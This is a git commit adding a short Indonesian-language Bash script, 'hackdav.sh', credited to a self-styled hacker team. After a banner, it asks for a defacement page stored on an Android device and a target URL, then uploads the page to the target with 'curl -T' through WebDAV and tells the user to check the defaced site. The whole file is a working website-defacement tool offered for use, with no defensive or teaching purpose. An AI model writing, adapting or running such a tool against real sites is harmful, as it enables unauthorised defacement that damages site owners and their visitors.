084c516511298cc613a764b66b394b18d7be7ad7
Aulia Rahman gnteng <83273573+Rhmn8@users.noreply.github.com>
2022-01-17 14:58:07 +0700

    Add files via upload

---
+++ hackdav.sh
@@ -0,0 +1,49 @@
+#jangan recode anying
+#recode tanpa izin? moga lu kena karma
+#mau recode? cht wa me! yg ada wa sy chat aje y
+# author : rahman ganz x aisyah cans
+# team   : kalteng xcyber team
+# github : github.com/Rhmn8 / follow github me
+# YouTube: bit.ly/AuliaRahmanOfficialYT / follow github me
+
+
+
+blue='\033[34;1m'
+green='\033[32;1m'
+purple='\033[35;1m'
+cyan='\033[36;1m'
+red='\033[31;1m'
+white='\033[37;1m'
+yellow='\033[33;1m'
+
+
+clear
+
+echo "[...............................................]"|lolcat
+echo "[ AUTHOR : RAHMAN GNTNG                         ]"|lolcat
+echo "[ GITHUB : github.com/Rhmn8                     ]"|lolcat
+echo "[ YOUTUBE: bit.ly/AuliaRahmanOfficialYT         ]"|lolcat
+echo "[ TEAM   : KALTENG XCYBER TEAM                  ]"|lolcat
+echo "[ NOTE   : script deface harus letakan disdcard ]"|lolcat
+echo "[ dan jangan dimasukan kefolder apapun          ]"|lolcat
+echo "[...............................................]"|lolcat
+
+
+echo ""
+echo -n $yellow"Script deface lu :" 
+read sc
+echo ""
+
+
+
+echo -n $i"Masukan Target:" 
+read tg
+echo ""
+echo -n $i"Target $tg !" $cy"tekan enter untuk ngehack:v"
+read trgt
+curl -T /storage/emulated/0/$sc $tg
+echo ""
+echo ""
+echo $blue"========================================"
+echo $red"Silakan Di Cek di $cy $tg/$sc" 
+echo $cyan"========================================"
